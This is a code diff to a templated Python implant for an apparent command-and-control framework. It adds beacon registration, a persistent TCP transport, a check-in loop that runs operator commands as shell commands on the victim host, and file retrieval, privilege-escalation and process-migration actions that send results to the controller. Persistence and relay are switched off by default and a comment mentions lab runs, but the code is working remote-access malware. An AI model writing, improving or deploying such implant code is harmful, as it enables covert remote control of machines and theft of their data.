@@ -74,10 +74,11 @@ class StubConfig:
     sleep: int = 60                    # seconds
     jitter: int = 20                   # percent (0-100)
 
-    # Feature toggles
-    persistence: bool = True
+    # Feature toggles — off by default: a lab run of a fresh payload must not
+    # write registry/crontab entries or open a relay listener unasked.
+    persistence: bool = False
     migration: bool = True
-    relay: bool = True                 # Named-pipe / TCP P2P relay
+    relay: bool = False                # Named-pipe / TCP P2P relay
     anti_analysis: bool = False        # VM / sandbox detection
     obfuscation: Optional[str] = None  # "none" | "light" | "medium" | "heavy" | path-to-module
 
@@ -603,36 +604,64 @@ class BaseTransport:
     def send(self, data: bytes) -> bytes:
         raise NotImplementedError
 
+    def request(self, msg: dict) -> dict:
+        """One JSON message in, one JSON reply out."""
+        raw = self.send(_j.dumps(msg).encode())
+        if not raw:
+            return {}
+        return _j.loads(raw.decode("utf-8", "replace").strip())
+
     def close(self):
         pass
 
 class TCPTransport(BaseTransport):
+    """Newline-delimited JSON over a single long-lived connection.
+
+    The listener reads with readline() and keeps a session bound to the
+    connection that registered, so a fresh socket per beacon would either be
+    misparsed or re-register the agent as a new session every time.
+    """
     name = "tcp"
 
     def __init__(self, host: str, port: int, timeout: int = 15):
         self._host = host
         self._port = port
         self._timeout = timeout
+        self._sock = None
 
-    def send(self, data: bytes) -> bytes:
-        with _sk.socket(_sk.AF_INET, _sk.SOCK_STREAM) as s:
+    def _connect(self):
+        if self._sock is None:
+            s = _sk.socket(_sk.AF_INET, _sk.SOCK_STREAM)
             s.settimeout(self._timeout)
             s.connect((self._host, self._port))
-            s.sendall(_st.pack(">I", len(data)) + data)
-            hdr = b""
-            while len(hdr) < 4:
-                chunk = s.recv(4 - len(hdr))
-                if not chunk:
-                    raise TransportError("connection closed")
-                hdr += chunk
-            n = _st.unpack(">I", hdr)[0]
-            buf = b""
-            while len(buf) < n:
-                chunk = s.recv(min(4096, n - len(buf)))
-                if not chunk:
-                    raise TransportError("connection closed")
-                buf += chunk
-            return buf
+            self._sock = s
+        return self._sock
+
+    def _read_line(self, s) -> bytes:
+        buf = b""
+        while not buf.endswith(b"\n"):
+            chunk = s.recv(4096)
+            if not chunk:
+                raise TransportError("connection closed")
+            buf += chunk
+        return buf
+
+    def send(self, data: bytes) -> bytes:
+        s = self._connect()
+        try:
+            s.sendall(data + b"\n")
+            return self._read_line(s)
+        except Exception:
+            self.close()
+            raise
+
+    def close(self):
+        if self._sock is not None:
+            try:
+                self._sock.close()
+            except Exception:
+                pass
+            self._sock = None
 
 class HTTPTransport(BaseTransport):
     name = "http"
@@ -856,8 +885,14 @@ def mod_processes():
 {% if include_exec %}
 def mod_exec(command: str, timeout: int = 60) -> dict:
     try:
-        shell = PLATFORM == "windows"
-        p = _sp.run(command, capture_output=True, text=True,
+        if PLATFORM == "windows":
+            argv, shell = command, True
+        else:
+            # With shell=False subprocess treats a plain string as an executable
+            # path and no arguments, so "id -u" would fail; split it instead of
+            # routing every command through a shell.
+            argv, shell = _sh.split(command), False
+        p = _sp.run(argv, capture_output=True, text=True,
                     timeout=timeout, shell=shell)
         return {
             "stdout": p.stdout,
@@ -1283,24 +1318,97 @@ def _dispatch(task: dict) -> dict:
     return {"error": f"unknown action: {action}"}
 
 def _c2_roundtrip(transport) -> bool:
-    """Send a check-in beacon and dispatch any tasks returned."""
+    """Register, then beacon on that session until the link breaks."""
+    session_id = _register(transport)
+    _log(f"registered as session {session_id}")
+    _run_session(transport, session_id)
+    return True
+
+def _register(transport) -> str:
+    ident = identity()
+    resp = transport.request({
+        "type": "register",
+        "hostname": ident["hostname"],
+        "os": ident["os"],
+        "arch": ident["arch"],
+        "username": ident["user"],
+        "agent_version": ident["version"],
+    })
+    if resp.get("type") != "registered" or not resp.get("session_id"):
+        raise TransportError(f"register refused: {resp!r}")
+    return resp["session_id"]
+
+def _run_session(transport, session_id: str) -> None:
+    """Check in, run what the server queues, report back, repeat.
+
+    Returns only when the connection fails; main() then re-registers. Sleeping
+    between check-ins happens on the same socket because the listener ties the
+    session to the connection that opened it.
+    """
+    base_sleep = {{ cfg.sleep }}
+    jitter_pct = {{ cfg.jitter }}
+    while True:
+        resp = transport.request({"type": "checkin", "session_id": session_id})
+        if resp.get("type") == "error":
+            raise TransportError(f"checkin refused: {resp.get('message')}")
+        for task in resp.get("commands", []):
+            result = _run_command(task.get("command", ""))
+            transport.request({
+                "type": "output",
+                "session_id": session_id,
+                "command_id": task.get("command_id", ""),
+                "output": result,
+            })
+        _jittered_sleep(base_sleep, jitter_pct)
+
+def _run_command(text: str) -> str:
+    """Run one line of operator input and return output as text.
+
+    Anything that is not a named module action is executed as a shell command,
+    which is what an operator typing into `sessions interact` expects.
+    """
+    text = (text or "").strip()
+    if not text:
+        return ""
+    task = _parse_command(text)
     try:
-        transport = transport or make_transport()
-        checkin = _j.dumps({"agent": identity(), "data": None}).encode()
-        raw = transport.send(checkin)
-        if not raw:
-            return False
-        tasks = _j.loads(raw)
-        if isinstance(tasks, dict):
-            tasks = [tasks]
-        for task in tasks:
-            result = _dispatch(task)
-            followup = _j.dumps({"agent": identity(), "result": result}).encode()
-            transport.send(followup)
-        return True
+        result = _dispatch(task)
+    except SystemExit:
+        raise
     except Exception as e:
-        _log(f"beacon error: {e}", "debug")
-        return False
+        return f"error: {e}"
+    if isinstance(result, dict) and "stdout" in result:
+        out = result.get("stdout") or ""
+        err = result.get("stderr") or ""
+        rc = result.get("returncode")
+        if err:
+            out += err if out else ""
+        if rc:
+            out += f"\n[exit {rc}]"
+        return out.strip() or f"[no output, exit {rc}]"
+    if isinstance(result, str):
+        return result
+    try:
+        return _j.dumps(result, default=str)
+    except Exception:
+        return str(result)
+
+def _parse_command(text: str) -> dict:
+    verb, _, rest = text.partition(" ")
+    v, arg = verb.lower(), text[len(verb):].strip()
+    if v in ("sysinfo", "network", "privesc_check", "privesc_suggest", "ping"):
+        return {"action": v}
+    if v == "ps":
+        return {"action": "processes"}
+    if v in ("exit", "shutdown"):
+        return {"action": "shutdown"}
+    if v == "fs_list":
+        return {"action": "fs_list", "path": arg or "."}
+    if v == "fs_get":
+        return {"action": "fs_get", "path": arg}
+    if v == "migrate":
+        return {"action": "migrate", "target": arg}
+    return {"action": "exec", "command": text}
 
 # --------------------------------------------------------------------- #
 #  Main entry point
@@ -1320,21 +1428,14 @@ def main():
     except Exception as e:
         _log(f"relay error: {e}", "debug")
     {% endif %}
-    base_sleep = {{ cfg.sleep }}
-    jitter_pct = {{ cfg.jitter }}
-    transport = make_transport()
     while True:
+        transport = make_transport()
         try:
             _c2_roundtrip(transport)
         except Exception as e:
-            _log(f"main loop: {e}", "debug")
-            # Reconnect with new transport
-            try:
-                transport.close()
-            except Exception:
-                pass
-            transport = make_transport()
-        _jittered_sleep(base_sleep, jitter_pct)
+            _log(f"link lost: {e}", "debug")
+            transport.close()
+            _jittered_sleep({{ cfg.sleep }}, {{ cfg.jitter }})
 
 if __name__ == "__main__":
     # Support --child-migrated so forked children skip persistence + relay bootstrap.
